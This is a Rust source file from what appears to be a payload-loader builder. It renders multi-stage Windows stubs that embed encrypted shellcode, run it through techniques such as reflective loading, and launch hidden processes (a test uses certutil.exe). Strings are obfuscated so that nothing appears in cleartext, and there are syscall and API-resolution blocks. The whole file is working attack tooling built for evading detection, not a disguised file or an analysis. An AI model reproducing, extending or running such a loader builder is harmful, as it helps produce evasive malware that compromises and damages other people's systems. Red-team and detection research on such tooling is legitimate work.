//! Multi-stage stub rendering (schema 5).
//!
//! A plan with an explicit `stages:` list is rendered from
//! `templates/stub/main_stages.rs.tpl`: every payload is embedded, each
//! `technique` stage's pipeline is wrapped in its own module (so two stages can
//! use the same technique without colliding on top-level names), each `exec`
//! stage gets a process launcher, and a generated runner walks the stages in
//! order with the declared gating.
//!
//! The single-payload path does **not** go through here: it keeps rendering the
//! builtin `main.rs.tpl` through [`super::stub`], so its output is unchanged.

use std::collections::BTreeMap;

use super::api_resolution::ApiResolutionConfig;
use super::obfuscation::StringsConfig;
use super::syscalls::SyscallsConfig;
use super::{args, debug, imports, stub, syscalls, BuildError, Result};
use crate::plan::schema::{PayloadFormat, StageAction, StageFailure, StageOutcome, WindowMode};
use crate::techniques::RuntimeStep;

/// The builtin multi-stage template's required placeholders.
const REQUIRED: &[&str] = &[
    "$STAGE_MODULES$",
    "$STAGE_RUNNER_BODY$",
    "$SYSCALLS_BLOCK$",
    "$ARGS_BLOCK$",
    "$IMPORTS_BLOCK$",
    "$API_RESOLUTION_BLOCK$",
];

/// A resolved `exec` stage handed to the renderer.
#[derive(Debug, Clone)]
pub struct ExecParams {
    /// The process to launch.
    pub binary: String,
    /// Arguments passed to `binary`.
    pub args: Vec<String>,
    /// Wait for the child and capture its exit code.
    pub wait: bool,
    /// Window visibility.
    pub window: WindowMode,
    /// Seconds to wait before terminating the child (0 = no limit).
    pub timeout_s: u64,
}

/// One resolved stage handed to the renderer.
#[derive(Debug, Clone)]
pub struct StagePayload {
    /// Position in the chain (0-based).
    pub index: usize,
    /// Human label.
    pub label: String,
    /// What the stage does.
    pub action: StageAction,
    /// XChaCha20 nonce (24 bytes).
    pub nonce: [u8; 24],
    /// Symmetric key (32 bytes).
    pub key: [u8; 32],
    /// Original payload size.
    pub plaintext_len: usize,
    /// Path to the ciphertext for `include_bytes!` (relative to `main.rs`).
    pub payload_path: Option<String>,
    /// The payload's binary format.
    pub format: PayloadFormat,
    /// Exported function for `format: dll`.
    pub export: Option<String>,
    /// The `technique` stage's pipeline.
    pub runtime: Vec<RuntimeStep>,
    /// The `exec` stage's parameters.
    pub exec: Option<ExecParams>,
    /// `sleep`: milliseconds.
    pub sleep_ms: u64,
    /// `technique`: the payload's fixed arguments (`build.payload.args`).
    pub payload_args: Vec<String>,
    /// `technique`: whether the runtime args replace the YAML ones.
    pub args_override: bool,
    /// Per-stage unique marker.
    pub marker: String,
    /// What to do when the stage completes.
    pub on_success: StageOutcome,
    /// What to do when the stage fails.
    pub on_fail: StageFailure,
    /// Delay before starting the stage.
    pub delay_ms: u64,
}

/// Everything the multi-stage template needs.
#[derive(Debug, Clone)]
pub struct StagesParams {
    /// The ordered stages.
    pub stages: Vec<StagePayload>,
    /// Positional build args, exposed as `$ARG_<key>$`.
    pub build_args: BTreeMap<String, String>,
    /// Whether the stub is a debug artifact.
    pub debug: bool,
    /// Whether the artifact uses the `windows` subsystem.
    pub windows_subsystem: bool,
}

/// Renders the multi-stage stub template.
pub fn render_stages_main_rs(
    template: &str,
    params: &StagesParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<String> {
    for required in REQUIRED {
        if !template.contains(required) {
            return Err(BuildError::InvalidTemplate(format!(
                "placeholder '{required}' does not appear in the multi-stage template"
            )));
        }
    }

    let union: Vec<RuntimeStep> = params
        .stages
        .iter()
        .flat_map(|stage| stage.runtime.iter().cloned())
        .collect();

    let modules: String = params
        .stages
        .iter()
        .map(|stage| render_stage_module(stage, strings))
        .collect();
    let runner = render_runner_body(&params.stages, strings);

    let mut values = BTreeMap::new();
    values.insert("$STAGE_MODULES$".to_string(), modules);
    values.insert("$STAGE_RUNNER_BODY$".to_string(), runner);
    values.insert(
        "$SYSCALLS_BLOCK$".to_string(),
        syscalls::render_block_with(
            syscalls_config,
            &union,
            strings,
            &api_resolution.required_syscalls(),
        ),
    );
    // Per-stage payload args are delivered through a thread-local context the
    // runner sets before each technique stage (`crate::set_stage_args`).
    values.insert(
        "$ARGS_BLOCK$".to_string(),
        args::render_block_multistage(&union, strings),
    );
    values.insert(
        "$IMPORTS_BLOCK$".to_string(),
        imports::render_block(&union, strings),
    );
    values.insert(
        "$API_RESOLUTION_BLOCK$".to_string(),
        if imports::needed(&union) {
            super::api_resolution::render_block(api_resolution, strings)
        } else {
            String::new()
        },
    );
    for (name, value) in &params.build_args {
        values.insert(format!("$ARG_{name}$"), value.clone());
    }

    let mut source = stub::substitute_template(template, &values)?;
    source.push_str(debug::render_prelude(
        params.debug,
        params.windows_subsystem,
    ));
    Ok(source)
}

/// Renders one stage's module.
fn render_stage_module(stage: &StagePayload, strings: &StringsConfig) -> String {
    match stage.action {
        StageAction::Technique => {
            let (preparation, execution) = stub::render_blocks(
                &stage.runtime,
                strings,
                stage.format,
                stage.export.as_deref(),
            );
            format!(
                "mod stage_{index} {{\n{preparation}\n{execution}\n\
                 pub fn preps() -> Result<bool, String> {{ run_preparations() }}\n\
                 pub fn payload(image: &mut [u8]) -> Result<i32, String> {{ execute_payload(image) }}\n}}\n",
                index = stage.index,
            )
        }
        StageAction::Exec => {
            let body = render_exec_fragment(stage, strings);
            format!("mod stage_{index} {{\n{body}\n}}\n", index = stage.index)
        }
        StageAction::Sleep => String::new(),
    }
}

/// Renders the runner body: one straight-line block per stage, in order.
fn render_runner_body(stages: &[StagePayload], strings: &StringsConfig) -> String {
    let mut body = String::new();
    for stage in stages {
        body.push_str(&format!(
            "\n    // --- stage {}: {} '{}' ---\n",
            stage.index,
            stage.action.label(),
            stage.label
        ));
        if stage.delay_ms > 0 {
            body.push_str(&sleep_line(stage.delay_ms));
        }
        match stage.action {
            StageAction::Technique => {
                let marker = strings
                    .obfuscate(&stage.marker)
                    .render_stub_expr("stub_marker");
                body.push_str(
                    &TECHNIQUE_STAGE
                        .replace("$INDEX$", &stage.index.to_string())
                        .replace("$LABEL$", &stage.label)
                        .replace(
                            "$PAYLOAD_PATH$",
                            stage.payload_path.as_deref().unwrap_or("payload.bin"),
                        )
                        .replace("$NONCE$", &hex::encode(stage.nonce))
                        .replace("$KEY$", &hex::encode(stage.key))
                        .replace("$LEN$", &stage.plaintext_len.to_string())
                        .replace("$MARKER$", &marker)
                        .replace("$ARGS$", &args_expr(&stage.payload_args, strings))
                        .replace(
                            "$OVERRIDE$",
                            if stage.args_override { "true" } else { "false" },
                        )
                        .replace("$SUCCESS$", success_action(stage.on_success))
                        .replace("$FAILURE$", failure_action(stage.on_fail)),
                );
            }
            StageAction::Exec => {
                body.push_str(
                    &EXEC_STAGE
                        .replace("$INDEX$", &stage.index.to_string())
                        .replace("$LABEL$", &stage.label)
                        .replace("$SUCCESS$", success_action(stage.on_success))
                        .replace("$FAILURE$", failure_action(stage.on_fail)),
                );
            }
            StageAction::Sleep => {
                body.push_str(&sleep_line(stage.sleep_ms));
            }
        }
    }
    body
}

fn sleep_line(ms: u64) -> String {
    format!("    std::thread::sleep(std::time::Duration::from_millis({ms}));\n")
}

/// The `Vec<String>` expression for a stage's YAML args, rebuilt at run time.
fn args_expr(args: &[String], strings: &StringsConfig) -> String {
    if args.is_empty() {
        return "vec![]".to_string();
    }
    let mut body = String::from("vec![\n");
    for (index, arg) in args.iter().enumerate() {
        let expr = strings
            .obfuscate(arg)
            .render_stub_expr(&format!("stage_arg_{index}"));
        body.push_str(&format!("            {expr},\n"));
    }
    body.push_str("        ]");
    body
}

/// The `on_success` code appended after a stage sets `last`.
fn success_action(outcome: StageOutcome) -> &'static str {
    match outcome {
        StageOutcome::Continue => "",
        StageOutcome::Stop => " return Ok(code);",
        StageOutcome::Exit => " return Ok(0);",
    }
}

/// The `on_fail` code run in the `Err(e)` arm.
fn failure_action(failure: StageFailure) -> &'static str {
    match failure {
        StageFailure::Stop => "return Err(e);",
        StageFailure::Continue => "eprintln!(\"{e}\");",
        StageFailure::Exit => "eprintln!(\"{e}\"); return Ok(0);",
    }
}

/// The `exec` stage's module body: a process launcher with all strings rebuilt
/// at run time through `StringsConfig`.
fn render_exec_fragment(stage: &StagePayload, strings: &StringsConfig) -> String {
    let exec = stage
        .exec
        .as_ref()
        .expect("validation guarantees an exec stage has a binary");
    let binary = strings
        .obfuscate(&exec.binary)
        .render_stub_expr("exec_binary");
    let args_def = if exec.args.is_empty() {
        "vec![]".to_string()
    } else {
        let mut body = String::from("vec![\n");
        for (index, arg) in exec.args.iter().enumerate() {
            let expr = strings
                .obfuscate(arg)
                .render_stub_expr(&format!("exec_arg_{index}"));
            body.push_str(&format!("            {expr},\n"));
        }
        body.push_str("        ]");
        body
    };
    let flags = match exec.window {
        WindowMode::Hidden => "CREATE_NO_WINDOW",
        WindowMode::Normal => "PROCESS_CREATION_FLAGS(0)",
    };
    let timeout_ms = exec.timeout_s.saturating_mul(1000).min(u32::MAX as u64);

    EXEC_FRAGMENT
        .replace("$BINARY_DEF$", &binary)
        .replace("$ARGS_DEF$", &args_def)
        .replace("$FLAGS$", flags)
        .replace("$WAIT$", if exec.wait { "true" } else { "false" })
        .replace("$TIMEOUT_MS$", &format!("{timeout_ms}u32"))
}

/// The generated runner block for a `technique` stage.
const TECHNIQUE_STAGE: &str = r#"
    {
        crate::set_stage_args($ARGS$, $OVERRIDE$);
        let enc: &[u8] = include_bytes!("$PAYLOAD_PATH$");
        let mut image = decrypt_stage(enc, "$NONCE$", "$KEY$", $LEN$)?;
        let stub_marker: String = $MARKER$;
        eprintln!("{stub_marker}");
        if !stage_$INDEX$::preps()? {
            return Ok(0);
        }
        match stage_$INDEX$::payload(&mut image) {
            Ok(code) => {
                last = code;$SUCCESS$
            }
            Err(e) => {
                $FAILURE$
            }
        }
    }
"#;

/// The generated runner block for an `exec` stage.
const EXEC_STAGE: &str = r#"
    {
        match stage_$INDEX$::run_exec() {
            Ok(code) => {
                last = code;$SUCCESS$
            }
            Err(e) => {
                $FAILURE$
            }
        }
    }
"#;

/// The `exec` stage module body. `$BINARY_DEF$`/`$ARGS_DEF$` are runtime
/// reconstructions; `$FLAGS$` is the creation-flags expression.
const EXEC_FRAGMENT: &str = r##"    use windows::core::{PCSTR, PSTR};
    use windows::Win32::Foundation::{BOOL, CloseHandle};
    use windows::Win32::System::Threading::{
        CreateProcessA, GetExitCodeProcess, WaitForSingleObject, CREATE_NO_WINDOW, INFINITE,
        PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA,
    };

    /// Resolves a bare binary name against `System32` (a path is used as is).
    fn resolve_binary(name: &str) -> String {
        if name.contains('\\') || name.contains('/') {
            return name.to_string();
        }
        let root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        format!("{root}\\System32\\{name}")
    }

    /// Quotes one argument for a Windows command line (the `CommandLineToArgvW`
    /// rules: backslash and quote handling).
    fn quote_arg(arg: &str) -> String {
        if !arg.is_empty() && !arg.bytes().any(|b| b == b' ' || b == b'\t' || b == b'"') {
            return arg.to_string();
        }
        let mut out = String::from("\"");
        let mut backslashes = 0usize;
        for ch in arg.chars() {
            match ch {
                '\\' => {
                    backslashes += 1;
                    out.push('\\');
                }
                '"' => {
                    for _ in 0..backslashes {
                        out.push('\\');
                    }
                    out.push('\\');
                    out.push('"');
                    backslashes = 0;
                }
                _ => {
                    backslashes = 0;
                    out.push(ch);
                }
            }
        }
        for _ in 0..backslashes {
            out.push('\\');
        }
        out.push('"');
        out
    }

    /// Launches the stage's process and returns its exit code (0 when detached).
    pub fn run_exec() -> Result<i32, String> {
        let binary: String = $BINARY_DEF$;
        let args: Vec<String> = $ARGS_DEF$;
        let exe = resolve_binary(&binary);
        let mut command = quote_arg(&exe);
        for arg in &args {
            command.push(' ');
            command.push_str(&quote_arg(arg));
        }
        let mut app = exe.as_bytes().to_vec();
        app.push(0);
        let mut cmd = command.into_bytes();
        cmd.push(0);

        let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
        startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

        unsafe {
            CreateProcessA(
                PCSTR(app.as_ptr()),
                PSTR(cmd.as_mut_ptr()),
                None,
                None,
                BOOL(0),
                $FLAGS$,
                None,
                PCSTR::null(),
                &startup,
                &mut pi,
            )
            .map_err(|e| format!("could not launch the stage binary: {e}"))?;
        }

        let code = if $WAIT$ {
            let timeout = if $TIMEOUT_MS$ == 0u32 { INFINITE } else { $TIMEOUT_MS$ };
            let _ = unsafe { WaitForSingleObject(pi.hProcess, timeout) };
            let mut code = 0u32;
            let _ = unsafe { GetExitCodeProcess(pi.hProcess, &mut code) };
            code as i32
        } else {
            0
        };

        let _ = unsafe { CloseHandle(pi.hThread) };
        let _ = unsafe { CloseHandle(pi.hProcess) };
        Ok(code)
    }
"##;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::StringsConfig;

    fn strings() -> StringsConfig {
        StringsConfig::from_yaml(None).expect("default strings")
    }

    fn technique_stage(index: usize) -> StagePayload {
        StagePayload {
            index,
            label: format!("s{index}"),
            action: StageAction::Technique,
            nonce: [0u8; 24],
            key: [0u8; 32],
            plaintext_len: 16,
            payload_path: Some(format!("payload_{index}.bin")),
            format: PayloadFormat::Shellcode,
            export: None,
            runtime: vec![serde_yml::from_str("technique: reflective_loading\n").unwrap()],
            exec: None,
            sleep_ms: 0,
            payload_args: Vec::new(),
            args_override: false,
            marker: format!("STUB_MARKER_{index}"),
            on_success: StageOutcome::Continue,
            on_fail: StageFailure::Stop,
            delay_ms: 0,
        }
    }

    fn exec_stage(index: usize) -> StagePayload {
        StagePayload {
            index,
            label: format!("e{index}"),
            action: StageAction::Exec,
            nonce: [0u8; 24],
            key: [0u8; 32],
            plaintext_len: 0,
            payload_path: None,
            format: PayloadFormat::Pe,
            export: None,
            runtime: Vec::new(),
            exec: Some(ExecParams {
                binary: "certutil.exe".to_string(),
                args: vec!["-f".to_string()],
                wait: true,
                window: WindowMode::Hidden,
                timeout_s: 30,
            }),
            sleep_ms: 0,
            payload_args: Vec::new(),
            args_override: false,
            marker: String::new(),
            on_success: StageOutcome::Continue,
            on_fail: StageFailure::Stop,
            delay_ms: 0,
        }
    }

    fn template() -> String {
        std::fs::read_to_string(
            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("templates")
                .join("stub")
                .join("main_stages.rs.tpl"),
        )
        .expect("template")
    }

    #[test]
    fn two_technique_stages_render_two_modules() {
        let params = StagesParams {
            stages: vec![technique_stage(0), technique_stage(1)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
        };
        let out = render_stages_main_rs(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(out.contains("mod stage_0 {"), "stage 0 module missing");
        assert!(out.contains("mod stage_1 {"), "stage 1 module missing");
        assert!(
            out.contains("include_bytes!(\"payload_0.bin\")"),
            "payload 0 not embedded"
        );
        assert!(
            out.contains("include_bytes!(\"payload_1.bin\")"),
            "payload 1 not embedded"
        );
        assert!(out.contains("fn run() -> Result<i32, String>"));
    }

    #[test]
    fn an_exec_stage_renders_a_launcher() {
        let params = StagesParams {
            stages: vec![technique_stage(0), exec_stage(1)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
        };
        let out = render_stages_main_rs(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(out.contains("pub fn run_exec()"), "exec launcher missing");
        assert!(out.contains("CreateProcessA"), "CreateProcessA missing");
        assert!(out.contains("CREATE_NO_WINDOW"), "hidden window missing");
        assert!(
            out.contains("stage_1::run_exec()"),
            "runner does not call the exec stage"
        );
    }

    #[test]
    fn per_stage_args_reach_the_runner_obfuscated() {
        let mut stage = technique_stage(0);
        stage.payload_args = vec!["--first".to_string()];
        stage.args_override = true;
        let params = StagesParams {
            stages: vec![stage],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
        };
        let out = render_stages_main_rs(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        assert!(out.contains("crate::set_stage_args("), "stage args not set");
        assert!(out.contains("set_stage_args"), "no stage-args context");
        // The argument literal is rebuilt at runtime, never in cleartext.
        assert!(!out.contains("--first"), "the arg leaked in cleartext");
    }

    #[test]
    fn a_missing_placeholder_is_an_error() {
        let params = StagesParams {
            stages: vec![technique_stage(0)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
        };
        let result = render_stages_main_rs(
            "fn main() {}",
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        );
        assert!(result.is_err());
    }

    /// Compiles a two-shellcode + one-exec stub to a PE. The real end-to-end
    /// check of the multi-stage renderer; marked `#[ignore]` because it needs
    /// `rustc` and the compiled dependencies (`cargo test -- --ignored`).
    #[test]
    #[ignore = "requires rustc and the compiled dependencies"]
    fn a_multi_stage_stub_compiles_to_a_pe() {
        use crate::engine::compiler;
        use crate::plan::schema::Arch;

        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("build")
            .join("stages_test");
        std::fs::create_dir_all(&dir).unwrap();
        for index in [0usize, 2] {
            std::fs::write(dir.join(format!("payload_{index}.bin")), [0u8; 16]).unwrap();
        }

        let params = StagesParams {
            stages: vec![technique_stage(0), exec_stage(1), technique_stage(2)],
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
        };
        let source = render_stages_main_rs(
            &template(),
            &params,
            &strings(),
            &SyscallsConfig::default(),
            &ApiResolutionConfig::default(),
        )
        .expect("render");
        let main_path = dir.join("main.rs");
        std::fs::write(&main_path, &source).unwrap();

        let deps = compiler::locate_stub_deps(Arch::X64).expect("deps");
        let out = dir.join("out.exe");
        compiler::compile_stub(&main_path, &out, &deps, compiler::CompileOptions::default())
            .expect("compile");
        let bytes = std::fs::read(&out).expect("read");
        assert_eq!(&bytes[..2], b"MZ", "the stub must be a Windows PE");
    }
}
